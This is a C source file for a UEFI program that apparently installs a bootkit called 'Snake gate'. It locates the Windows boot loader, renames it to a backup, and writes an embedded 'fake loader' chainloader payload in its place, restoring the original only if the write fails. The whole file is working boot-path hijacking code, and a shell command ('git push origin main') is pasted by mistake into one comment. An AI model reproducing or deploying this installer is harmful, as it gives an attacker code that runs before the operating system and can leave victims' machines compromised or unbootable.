#undef __STDC_VERSION__
#include <efi.h>   
#include <uefi.h>  
#include "video.h"
#include "file_utils.h"
#include "config.h"
#include "chainloader_payload.h"


int main(int argc, char **argv) {
    resetScreen(0);
    //checking if there is a fake
    EFI_HANDLE backupHandle = findPartition(BackupLoaderW);
    if(backupHandle != NULL) {
        printf("ERROR: Snake gate already exists on the disk\n");
        printf("Press any key...\n");
        getchar();
        return 1;
    }

    //finding partition with windows
    EFI_HANDLE partitionHandle = findPartition(OriginalLoaderW);
    if(partitionHandle == NULL) {
        printf("ERROR: Windows loader not found\n");
        printf("Press any key...\n");
        getchar();
        return 1;
    }
    EFI_FILE_PROTOCOL* root = openRoot(partitionHandle);
    if(root == NULL) {
        printf("ERROR: Could not access backup partition\n");
        printf("Press any key...\n");
        getchar();
        return 1;
    }

    //renaming of loader
    EFI_STATUS status = renameFile(root, OriginalLoaderW, BackupLoaderW);

    if(EFI_ERROR(status)) {
        printf("ERROR: Could not change name of original loader\n");
        printf("Press any key...\n");
        getchar();
        root->Close(root);
        return 1;
    }

    //creating fake loadergit push origin main
    UINTN realSize = (UINTN)chainloader_efi_len;
    status = writeFileToRoot(root, OriginalLoaderW, chainloader_efi, realSize);
    if(EFI_ERROR(status)){
        printf("ERROR: Failed to create snake gate on the disk\n");
        printf("INFO: The original Windows loader will be restored\n");
        status = renameFile(root, BackupLoaderW, OriginalLoaderW);
        if(!EFI_ERROR(status)){
            printf("SUCCESS: Windows loader reinstated successfully\n");
            printf("Press any key...\n");
        } else {
            printf("ERROR: Could not change name of original loader\n");
            printf("Windows will most likely fail to boot\n");
            printf("Press any key...\n");
        }
        getchar();
    }

    root->Close(root);
    return EFI_ERROR(status) ? 1 : 0;
}